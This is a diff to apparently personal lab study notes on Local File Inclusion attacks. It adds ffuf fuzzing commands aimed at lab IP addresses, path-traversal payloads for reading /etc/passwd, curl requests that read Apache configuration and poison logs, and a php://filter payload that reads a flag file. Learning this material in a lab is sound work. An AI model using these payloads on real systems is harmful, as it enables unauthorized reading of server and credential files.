@@ -384,6 +384,9 @@ online URL encoder utility
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
 ```
 
+```
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://154.57.164.74:30195/FUZZ.php
+```
 **STANDARD LFI REQUEST**
 
 ```text
@@ -439,17 +442,6 @@ config.php
 ```text
 /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 ```
-
-**TOOLS**
-
-```text
-ffuf
-base64
-```
-
----
-
-
 # PHP Wrappers 
 
 **PHP CONFIGURATION FILE PATHS**
@@ -980,6 +972,139 @@ PHPSESSID
 curl
 Burp Suite
 ```
+
+```
+curl -s "http://154.57.164.66:31322/index.php" -H @Poison
+```
+# Automated Scanning
+
+**FUZZ PARAMETERS**
+
+```shellsession
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+```
+
+**PARAMETER DISCOVERY RESULT**
+
+```text
+language
+```
+
+**LFI WORDLIST FUZZING**
+
+```shellsession
+ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+```
+
+**COMMON LFI PAYLOAD RESULTS**
+
+```text
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+../../../../../../../../../../../../etc/hosts
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd&=%3C%3C%3C%3C
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+**WORDLISTS**
+
+```text
+/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
+/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+/opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
+/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
+./LFI-WordList-Linux
+```
+
+**FUZZ WEBROOT PATH**
+
+```shellsession
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+```
+
+**WEBROOT RESULT**
+
+```text
+/var/www/html/
+```
+
+**FUZZ SERVER FILES**
+
+```shellsession
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+```
+
+**DISCOVERED FILES**
+
+```text
+/etc/hosts
+/etc/hostname
+/etc/login.defs
+/etc/fstab
+/etc/apache2/apache2.conf
+/etc/issue.net
+/etc/apache2/mods-enabled/status.conf
+/etc/apache2/mods-enabled/alias.conf
+/etc/apache2/envvars
+/etc/adduser.conf
+```
+
+**READ APACHE CONFIG**
+
+```shellsession
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+```
+
+**READ APACHE ENV VARIABLES**
+
+```shellsession
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+```
+
+**SERVER CONFIG VALUES**
+
+```text
+DocumentRoot /var/www/html
+ErrorLog ${APACHE_LOG_DIR}/error.log
+CustomLog ${APACHE_LOG_DIR}/access.log combined
+export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
+```
+
+**TOOLS**
+
+```text
+ffuf
+curl
+LFISuite
+LFiFreak
+liffy
+```
+
+
+```
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+-u 'http://154.57.164.74:30195/index.php?FUZZ=test'
+```
+
+```
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.74:30195/index.php?FUZZ=value' -fs 3405
+```
+
+```
+ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.64:31400/index.php?view=FUZZ' -fs 2309
+```
+then it was long response so manually opened 1935/515 found its blank and added them to the -fs 
+```
+ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.64:31400/index.php?view=FUZZ' -fs 2309,1935,515
+
+```
+
+
+php://filter/read=convert.base64-encode/resource=/flag.txt
+
+154.57.164.74:30195
 
 
 # 
